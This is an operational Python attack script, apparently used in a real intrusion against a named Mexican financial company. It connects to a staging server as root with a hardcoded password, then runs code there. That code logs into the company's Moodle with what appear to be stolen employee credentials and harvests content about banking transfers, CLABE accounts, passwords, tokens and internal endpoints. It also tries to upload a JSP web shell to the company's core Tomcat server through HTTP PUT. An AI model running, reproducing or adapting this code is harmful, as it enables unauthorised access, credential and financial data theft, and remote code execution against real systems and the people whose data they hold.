import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r'''
import requests, urllib3, json, sys, re
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

ms = requests.Session()
ms.verify = False
ms.headers.update({"User-Agent": UA})
MOODLE = "https://universidad.findep.mx"

# Login
r_login = ms.get(f"{MOODLE}/login/index.php", timeout=10)
lt = re.search(r'name="logintoken"\s+value="([^"]+)"', r_login.text)
r_auth = ms.post(f"{MOODLE}/login/index.php",
    data={"username": "aguzmango", "password": "Capacita-1", "logintoken": lt.group(1) if lt else ""},
    timeout=10, allow_redirects=True)
sys.stdout.write(f"Logged in: {'aguzmango' in r_auth.text}\n\n")


# ========================================
# 1. EXTRACT SEARCH RESULTS FOR FINANCIAL TERMS
# ========================================
sys.stdout.write("=" * 60 + "\n=== MOODLE SEARCH — FINANCIAL INTEL ===\n" + "=" * 60 + "\n\n")

terms = ["SPEI", "dispersion", "STP", "CLABE", "transferencia bancaria",
         "tesoreria", "contabilidad", "cuenta destino", "referencia pago",
         "sistema core", "core findep", "webservice", "password", "token",
         "API", "endpoint", "servidor", "base datos", "produccion"]

for term in terms:
    sys.stdout.write(f"\n{'='*40}\n>>> Search: '{term}'\n{'='*40}\n")
    try:
        r = ms.get(f"{MOODLE}/search/index.php?q={term}&perpage=20", timeout=15)
        
        # Extract search results
        # Moodle search results are in <div class="result">
        results = re.findall(r'class="search-result-content"[^>]*>(.*?)</div>', r.text, re.S | re.I)
        if not results:
            results = re.findall(r'class="result[^"]*"[^>]*>(.*?)</(?:div|article)', r.text, re.S | re.I)
        if not results:
            # Try to get all text between search results markers
            search_section = re.search(r'id="region-main"[^>]*>(.*?)id="page-footer"', r.text, re.S)
            if search_section:
                # Extract titles and snippets
                titles = re.findall(r'<h[34][^>]*>(.*?)</h[34]>', search_section.group(1), re.S)
                snippets = re.findall(r'class="[^"]*text[^"]*"[^>]*>(.*?)</(?:div|p|span)>', search_section.group(1), re.S)
                
                for t in titles:
                    clean_t = re.sub(r'<[^>]+>', '', t).strip()
                    if clean_t and len(clean_t) > 3:
                        sys.stdout.write(f"  TITLE: {clean_t[:120]}\n")
                
                for s in snippets[:5]:
                    clean_s = re.sub(r'<[^>]+>', '', s).strip()
                    if clean_s and len(clean_s) > 10:
                        sys.stdout.write(f"  SNIPPET: {clean_s[:200]}\n")
        else:
            for res in results[:5]:
                clean = re.sub(r'<[^>]+>', ' ', res).strip()
                clean = re.sub(r'\s+', ' ', clean)
                sys.stdout.write(f"  {clean[:300]}\n")
        
        # Extract links from results
        result_links = re.findall(r'href="([^"]*(?:mod/|course/|pluginfile)[^"]*)"[^>]*>([^<]*)', r.text)
        unique_links = set()
        for href, text in result_links:
            if href not in unique_links and 'universidad.findep.mx' in href:
                unique_links.add(href)
                text_clean = re.sub(r'<[^>]+>', '', text).strip()
                if text_clean:
                    sys.stdout.write(f"  LINK: {text_clean[:60]} -> {href[:100]}\n")
        
        # Count results
        count = re.search(r'(\d+)\s+(?:result|resultado)', r.text, re.I)
        if count:
            sys.stdout.write(f"  TOTAL: {count.group(0)}\n")
        
        # Check if search returned "no results"
        if "no results" in r.text.lower() or "sin resultado" in r.text.lower() or "no se encontr" in r.text.lower():
            sys.stdout.write(f"  (no results)\n")
    except Exception as e:
        sys.stdout.write(f"  ERR: {e}\n")
    sys.stdout.flush()


# ========================================
# 2. ACCESS SPECIFIC PAGES/RESOURCES
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== ACCESS INDIVIDUAL PAGES ===\n" + "=" * 60 + "\n\n")

# Access mod/page resources from courses (these might contain procedure docs)
page_ids = [10328, 10329, 4363, 4368, 9852, 12799, 8001]

for pid in page_ids:
    try:
        r = ms.get(f"{MOODLE}/mod/page/view.php?id={pid}", timeout=10)
        if r.status_code == 200:
            title = re.search(r'<title>(.*?)</title>', r.text[:2000], re.I)
            
            # Extract main content
            content = re.search(r'class="no-overflow"[^>]*>(.*?)</div>', r.text, re.S)
            if not content:
                content = re.search(r'id="content"[^>]*>(.*?)</div>', r.text, re.S)
            if not content:
                content = re.search(r'role="main"[^>]*>(.*?)<div\s+id=', r.text, re.S)
            
            sys.stdout.write(f"\n--- Page {pid}: {title.group(1)[:60] if title else 'N/A'} ---\n")
            if content:
                clean = re.sub(r'<[^>]+>', ' ', content.group(1)).strip()
                clean = re.sub(r'\s+', ' ', clean)
                sys.stdout.write(f"  Content: {clean[:500]}\n")
            
            # Look for internal URLs
            internal = re.findall(r'https?://[\w.-]+\.findep\.(?:mx|com\.mx|global|dev)[\w./\-?=&]*', r.text)
            unique = set(u[:100] for u in internal if 'universidad' not in u)
            if unique:
                sys.stdout.write(f"  FINDEP URLs: {unique}\n")
            
            # Look for any files
            files = re.findall(r'href="([^"]*pluginfile[^"]*)"', r.text)
            if files:
                sys.stdout.write(f"  Files: {files[:5]}\n")
    except:
        pass
    sys.stdout.flush()

# Access resource files
resource_ids = [12566, 12567]
for rid in resource_ids:
    try:
        r = ms.get(f"{MOODLE}/mod/resource/view.php?id={rid}", timeout=10, allow_redirects=False)
        if r.status_code == 303 or r.status_code == 302:
            loc = r.headers.get("Location", "")
            sys.stdout.write(f"\n--- Resource {rid} -> {loc[:100]} ---\n")
            # Download file header
            r2 = ms.head(loc, timeout=10)
            ct = r2.headers.get("Content-Type", "")
            cl = r2.headers.get("Content-Length", "?")
            cd = r2.headers.get("Content-Disposition", "")
            sys.stdout.write(f"  Type: {ct}, Size: {cl}, Disposition: {cd[:100]}\n")
        elif r.status_code == 200:
            title = re.search(r'<title>(.*?)</title>', r.text[:2000], re.I)
            sys.stdout.write(f"\n--- Resource {rid}: {title.group(1)[:60] if title else 'N/A'} ---\n")
    except:
        pass
    sys.stdout.flush()

# Access URL resources
url_ids = [9852, 12799, 8001, 12568]
for uid in url_ids:
    try:
        r = ms.get(f"{MOODLE}/mod/url/view.php?id={uid}", timeout=10, allow_redirects=False)
        if r.status_code in [302, 303, 301]:
            loc = r.headers.get("Location", "")
            sys.stdout.write(f"\n--- URL {uid} -> {loc[:120]} ---\n")
        elif r.status_code == 200:
            ext_url = re.search(r'class="urlworkaround"[^>]*>.*?href="([^"]+)"', r.text, re.S)
            if ext_url:
                sys.stdout.write(f"\n--- URL {uid} -> {ext_url.group(1)[:120]} ---\n")
    except:
        pass
    sys.stdout.flush()


# ========================================
# 3. TOMCAT — TRY UPLOAD TO EXAMPLES DIR
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== TOMCAT PUT — ALTERNATIVE PATHS ===\n" + "=" * 60 + "\n\n")

CORE = "http://core.findep.mx:8080"
shell = '<%@ page import="java.io.*" %><%out.println("FINDEP-OK:" + System.getProperty("user.name"));%>'

# Try uploading to examples directory and other writable paths
alt_paths = [
    "/examples/test123.jsp/",
    "/examples/test123.jsp",
    "/examples/servlets/test123.jsp/",
    "/examples/jsp/test123.jsp/",
    "/docs/test123.jsp/",
    "/test123.txt",
    "/examples/test123.txt",
    "/examples/test123.html",
    # Try with different extensions
    "/test123.war",
]

for path in alt_paths:
    try:
        data = shell if ".jsp" in path else "test upload"
        r = requests.put(f"{CORE}{path}", data=data,
            headers={"User-Agent": UA, "Content-Type": "text/plain"},
            timeout=5, verify=False)
        if r.status_code not in [403, 404, 405]:
            sys.stdout.write(f"  *** [{r.status_code}] PUT {path} ***\n")
            # Verify
            clean = path.rstrip("/")
            r2 = requests.get(f"{CORE}{clean}", timeout=5, verify=False)
            if "test upload" in r2.text or "FINDEP-OK" in r2.text:
                sys.stdout.write(f"  *** WRITE CONFIRMED *** {clean}\n")
        else:
            sys.stdout.write(f"  [{r.status_code}] {path}\n")
    except:
        pass
    sys.stdout.flush()


sys.stdout.write("\n\n=== ALL DONE ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/fp_moodle_spei.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/fp_moodle_spei.py 2>&1', timeout=300)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
print('Fin.', flush=True)
